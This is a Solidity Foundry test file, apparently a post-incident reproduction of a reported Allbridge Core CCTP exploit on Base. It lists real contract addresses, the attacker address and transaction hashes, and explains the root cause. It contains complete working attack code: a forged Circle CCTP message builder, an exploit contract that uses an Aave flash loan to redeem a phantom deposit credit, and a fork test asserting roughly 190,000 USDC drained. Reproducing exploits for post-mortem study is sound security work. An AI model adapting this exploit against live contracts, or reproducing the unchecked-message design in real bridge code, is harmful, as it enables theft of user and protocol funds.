// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/// forge-config: default.evm_version = "cancun"

import "forge-std/Test.sol";

// Allbridge (Core / cross-chain Router + CCTP integration) — Base
// ~190,156 USDC extracted from the Router in a single Base tx; attacker nets 189,751.554381 USDC
// after the Aave V3 flash-loan premium.
//
// Exploit tx   : 0x9f906fcd8fceaa6745e8d1c004861dcfa9b5e6a893fe1e8c5d0013a4e982e6a8 (Base block 50157345)
// Forged msg tx: 0x2a88d79756b4547b33fea7b3c1420793680e2b8952bef4c65e99879e16b22140 (Polygon, ~24 days earlier)
// Attacker EOA : 0x2419432344b0B892E592b2601B98eaE702Ba360e
// Victim Router: 0xaA119F7442eCC28b9a8F236707ADA8362CFF24fF (Allbridge Core Router, CHAIN_ID 9)
// Messenger    : 0xf9b710e427bf4d93598e0f80a84de22c7ad9b577 (Allbridge CCTPTokenMessenger)
// MsgTransmitter: 0x81D40F21F12A8F0E3252Bccb954D722d4c464B64 (Circle MessageTransmitterV2)
// Aave V3 Pool : 0xA238Dd80C259a72e81d7e4664a9801593F98d1c5
// USDC (Base)  : 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913
//
// Root cause (permissionless code defect, re-verified this build against the verified source of
// both contracts and against live forked state — NO key/signer/admin compromise, every call below
// is reachable by any caller):
//
//   Allbridge's CCTPTokenMessenger.receiveCctpMessage(message, attestation) relays an attested
//   Circle message through MessageTransmitterV2.receiveMessage and then credits
//       receivedMessages[messageHash] = amount - feeExecuted
//   reading `amount`, `feeExecuted`, `sourceSender` and `messageHash` DIRECTLY out of fixed byte
//   offsets in the message body. It never checks that the message caused a real USDC mint / any
//   balance change (confirmed in src: after the receiveMessage call it does only the subtraction
//   and the mapping write). Its two guards are both attacker-satisfiable from public state:
//     - destinationCaller (message[108:140]) must equal the messenger's own address — public.
//     - sourceSender (message[248:280]) must equal remoteTokenMessengers[sourceChainId], where
//       sourceChainId = domainToChainId[sourceDomain]. Both mappings are public getters, so the
//       attacker just reads remoteTokenMessengers[5] and copies it into the forged body.
//
//   Circle's MessageTransmitterV2 is a GENERIC attestation primitive: sendMessage emits an
//   arbitrary caller-authored payload and Circle's off-chain attester signs THAT THE MESSAGE WAS
//   SUBMITTED, not that any value moved. So anyone can author a payload shaped like a CCTP deposit,
//   have it attested, and relay it here. (This off-chain attester is the one thing that cannot be
//   reproduced from a fork — see the note in the test where it is modeled.)
//
//   The Allbridge Router.receiveToken(...) then treats receivedTokenAmount(messageHash) > 0 as its
//   ONLY solvency check (confirmed in src) and pays out amountAfterFee to the caller-chosen
//   recipient. The credited messageHash is the first word of the forged message's hookData, which
//   the attacker precomputes as Router._calculateMessageHash(nonce, recipient, token, amount,
//   sourceChain, CHAIN_ID) for a redeem of its own choosing.
//
// Economics reproduced here (all figures match the on-chain event):
//   - Router already holds 191,155.976393 USDC at block-1 (a legitimate ~191,112 USDC CCTP inflow
//     had minted into it ~6s earlier). This PoC does NOT deal() that in — it is real forked state.
//   - The forged message declares a 1,000,000 USDC deposit (amount 1e12 raw, normalizedAmount 1e15).
//   - Router pays out 999,000 USDC (1,000,000 - 0.1% feeBp) and retains exactly 1,000 USDC.
//   - The attacker flash-loans (1,000,000 - Router balance) = 808,844.023607 USDC from Aave V3 and
//     pushes it into the Router so the 999,000 transfer succeeds, then repays 809,248.445619 USDC
//     (404.422012 premium). Net kept: 189,751.554381 USDC.
//
// This is a from-scratch reconstruction: the forged CCTP v2 message is assembled from typed
// Solidity values at the real field offsets, the message hash is recomputed with the Router's real
// keccak(abi.encodePacked(...)) layout, and every messenger/router/Aave call is a real typed call.
// No creation-bytecode blob, no raw-calldata replay.
//
// Run: forge test --contracts src/test/2026-08/AllbridgeCCTP_exp.sol -vvv

interface IERC20 {
    function balanceOf(
        address
    ) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICCTPTokenMessenger {
    function receiveCctpMessage(bytes calldata message, bytes calldata attestation) external;
    function remoteTokenMessengers(
        uint32 chainId
    ) external view returns (bytes32);
    function domainToChainId(
        uint32 domain
    ) external view returns (uint32);
}

interface IMessageTransmitterV2 {
    function receiveMessage(bytes calldata message, bytes calldata attestation) external returns (bool);
}

interface IAllbridgeRouter {
    function receiveToken(
        uint256 normalizedAmount,
        uint256 _nonce,
        uint32 sourceChain,
        bytes32 destinationToken,
        bytes32 recipient,
        address swapAddr,
        address tokenMessengersAddr,
        uint256 minSwapAmount
    ) external;
    function CHAIN_ID() external view returns (uint32);
}

// Builds the forged Circle CCTP v2 message (header + BurnMessageV2 body + hookData) purely from
// typed values, laying each field at the exact byte offset the Allbridge messenger reads. Mirrors
// the layout documented in CCTPTokenMessenger.receiveCctpMessage.
contract ForgedCctpMessageFactory {
    // CCTP v2 message header is 148 bytes; BurnMessageV2 body starts at offset 148.
    function buildMessage(
        uint32 sourceDomain, // -> sourceChainId via domainToChainId, gates sourceSender
        uint32 destinationDomain,
        bytes32 destinationCaller, // must equal the messenger address (message[108:140])
        bytes32 burnToken,
        bytes32 mintRecipient,
        uint256 amount, // message[216:248], read verbatim as the "deposit" size
        bytes32 sourceSender, // message[248:280], must equal remoteTokenMessengers[sourceChainId]
        uint256 feeExecuted, // message[312:344]
        bytes32 messageHash // first word of hookData, message[376:408]
    )
        external
        pure
        returns (bytes memory message)
    {
        bytes memory header = abi.encodePacked(
            uint32(1), // version
            sourceDomain, // [4:8]
            destinationDomain, // [8:12]
            bytes32(uint256(0x12345)), // nonce (Circle message nonce; not read by the messenger)
            sourceSender, // sender [44:76] (cosmetic; messenger reads body sourceSender)
            mintRecipient, // recipient [76:108] (cosmetic at the transmitter layer)
            destinationCaller, // [108:140]
            uint32(1000), // minFinalityThreshold [140:144]
            uint32(2000) // finalityThresholdExecuted [144:148]
        );

        bytes memory body = abi.encodePacked(
            uint32(1), // body version   body[0:4]    -> [148:152]
            burnToken, // burnToken       body[4:36]   -> [152:184]
            mintRecipient, // mintRecipient   body[36:68]  -> [184:216]
            amount, // amount          body[68:100] -> [216:248]
            sourceSender, // sourceSender    body[100:132]-> [248:280]
            uint256(0), // maxFee          body[132:164]-> [280:312]
            feeExecuted, // feeExecuted     body[164:196]-> [312:344]
            uint256(0), // expirationBlock body[196:228]-> [344:376]
            messageHash // hookData[0:32]  body[228:260]-> [376:408]
        );

        message = abi.encodePacked(header, body);
        require(message.length == 408, "unexpected message length");
    }

    // Circle attestation is v/r/s signatures by the enabled attester set. Its bytes are irrelevant
    // in this PoC because Circle's off-chain attester is modeled at the transmitter (see test);
    // shaped as one 65-byte signature so the typed call is well-formed.
    function buildAttestation() external pure returns (bytes memory) {
        return abi.encodePacked(bytes32(0), bytes32(0), uint8(0));
    }
}

// Named exploit contract. Takes a real Aave V3 flash loan, relays the forged message through the
// real messenger, and redeems the phantom credit through the real Router. Every external call is a
// typed call built from Solidity values.
contract AllbridgeCctpExploit {
    IERC20 internal constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IAaveV3Pool internal constant AAVE_POOL = IAaveV3Pool(0xA238Dd80C259a72e81d7e4664a9801593F98d1c5);
    ICCTPTokenMessenger internal constant MESSENGER =
        ICCTPTokenMessenger(0xf9B710E427bf4D93598E0F80A84de22C7Ad9B577);
    IAllbridgeRouter internal constant ROUTER = IAllbridgeRouter(0xaA119F7442eCC28b9a8F236707ADA8362CFF24fF);

    // Polygon's CCTP domain is 7; the messenger maps domain 7 -> Allbridge chainId 5. sourceSender
    // must equal remoteTokenMessengers[5], read live below.
    uint32 internal constant SRC_DOMAIN = 7;
    uint32 internal constant SRC_CHAIN_ID = 5;
    uint32 internal constant DST_DOMAIN = 6; // Base CCTP domain (transmitter layer)

    // Router redeem parameters. Chosen freely by the attacker; only constraint is that the hookData
    // hash matches Router._calculateMessageHash for exactly these values.
    uint256 internal constant NONCE = 12345;
    uint32 internal constant ROUTER_SRC_CHAIN = 12345;
    uint256 internal constant NORMALIZED_AMOUNT = 1e15; // -> 1,000,000 USDC (SYSTEM_DECIMALS 9 -> 6)
    uint256 internal constant GROSS_AMOUNT = 1_000_000e6; // declared deposit, raw USDC

    ForgedCctpMessageFactory internal immutable factory;

    constructor(
        ForgedCctpMessageFactory _factory
    ) {
        factory = _factory;
    }

    // Same layout as Router._calculateMessageHash: keccak(abi.encodePacked(nonce, recipient,
    // destinationToken, amount, sourceChain, destinationChain)).
    function _messageHash() internal view returns (bytes32) {
        return keccak256(
            abi.encodePacked(
                NONCE,
                bytes32(uint256(uint160(address(this)))), // recipient = this contract
                bytes32(uint256(uint160(address(USDC)))), // destinationToken = USDC
                NORMALIZED_AMOUNT,
                ROUTER_SRC_CHAIN,
                ROUTER.CHAIN_ID()
            )
        );
    }

    function attack() external {
        // Flash-loan exactly the shortfall between the declared deposit and the Router's real
        // balance, so the Router ends holding precisely the 0.1% fee.
        uint256 shortfall = GROSS_AMOUNT - USDC.balanceOf(address(ROUTER));
        AAVE_POOL.flashLoanSimple(address(this), address(USDC), shortfall, "", 0);
    }

    function executeOperation(
        address, /*asset*/
        uint256 amount,
        uint256 premium,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        // 1. Top the Router up to the declared 1,000,000 USDC so its later payout transfer succeeds.
        USDC.transfer(address(ROUTER), amount);

        // 2. Forge and relay the phantom deposit through the real messenger.
        bytes32 sourceSender = MESSENGER.remoteTokenMessengers(SRC_CHAIN_ID);
        bytes memory message = factory.buildMessage(
            SRC_DOMAIN,
            DST_DOMAIN,
            bytes32(uint256(uint160(address(MESSENGER)))), // destinationCaller == messenger
            bytes32(uint256(uint160(address(USDC)))), // burnToken
            bytes32(uint256(uint160(address(this)))), // mintRecipient (cosmetic)
            GROSS_AMOUNT, // amount credited verbatim
            sourceSender,
            0, // feeExecuted
            _messageHash()
        );
        bytes memory attestation = factory.buildAttestation();
        MESSENGER.receiveCctpMessage(message, attestation);

        // 3. Redeem the phantom credit; Router pays amountAfterFee (999,000 USDC) to this contract.
        ROUTER.receiveToken(
            NORMALIZED_AMOUNT,
            NONCE,
            ROUTER_SRC_CHAIN,
            bytes32(uint256(uint160(address(USDC)))), // destinationToken == intermediary (no swap)
            bytes32(uint256(uint160(address(this)))), // recipient == this (also authorizes the call)
            address(0), // swapAddr (unused, no swap)
            address(MESSENGER),
            0 // minSwapAmount
        );

        // 4. Repay the flash loan; the remainder is the net profit.
        USDC.approve(address(AAVE_POOL), amount + premium);
        return true;
    }
}

contract AllbridgeCCTP_exp is Test {
    IERC20 internal constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    address internal constant ROUTER = 0xaA119F7442eCC28b9a8F236707ADA8362CFF24fF;
    address internal constant MESSAGE_TRANSMITTER = 0x81D40F21F12A8F0E3252Bccb954D722d4c464B64;

    uint256 internal constant EXPLOIT_BLOCK = 50157345;

    ForgedCctpMessageFactory internal factory;
    AllbridgeCctpExploit internal exploit;

    function setUp() public {
        vm.createSelectFork("base", EXPLOIT_BLOCK - 1);
        factory = new ForgedCctpMessageFactory();
        exploit = new AllbridgeCctpExploit(factory);
    }

    function testExploit() public {
        // Precondition: the Router holds the ~191k victim balance; the attacker holds nothing.
        uint256 routerBefore = USDC.balanceOf(ROUTER);
        uint256 exploitBefore = USDC.balanceOf(address(exploit));
        emit log_named_decimal_uint("Router USDC before (drainable)", routerBefore, 6);
        assertEq(exploitBefore, 0, "attacker should start empty");
        assertGt(routerBefore, 190_000e6, "Router should hold the ~191k victim balance at block-1");

        // Model the ONE dependency a fork cannot reproduce: Circle's off-chain attester. Its
        // MessageTransmitterV2.receiveMessage signs only that a message was submitted, so for any
        // caller-authored payload it returns true. This is the exact primitive the attack abuses;
        // no on-chain Allbridge state is shortcut — the messenger and Router still execute in full.
        vm.mockCall(
            MESSAGE_TRANSMITTER,
            abi.encodeWithSelector(IMessageTransmitterV2.receiveMessage.selector),
            abi.encode(true)
        );

        exploit.attack();

        uint256 routerAfter = USDC.balanceOf(ROUTER);
        uint256 exploitAfter = USDC.balanceOf(address(exploit));

        uint256 profit = exploitAfter - exploitBefore;
        uint256 drained = routerBefore - routerAfter;
        emit log_named_decimal_uint("Router USDC after", routerAfter, 6);
        emit log_named_decimal_uint("Router USDC drained", drained, 6);
        emit log_named_decimal_uint("Attacker net USDC profit", profit, 6);

        // Router keeps exactly the 1,000 USDC (0.1%) fee; the 999,000 payout was backed by no real
        // deposit, so the ~190,156 USDC it lost was its own (the whole 191,156 minus the fee).
        assertEq(routerAfter, 1_000e6, "Router should retain exactly the 1,000 USDC (0.1%) fee");
        assertApproxEqAbs(drained, 190_155_976393, 1e6, "drained != the ~190,156 USDC extracted");
        // Net after the 404.42 USDC Aave premium; on-chain figure was 189,751.554381 USDC.
        assertApproxEqAbs(profit, 189_751_554381, 1e6, "net profit diverged from on-chain ~189,752 USDC");
        assertGt(profit, 0, "no profit extracted");
    }
}
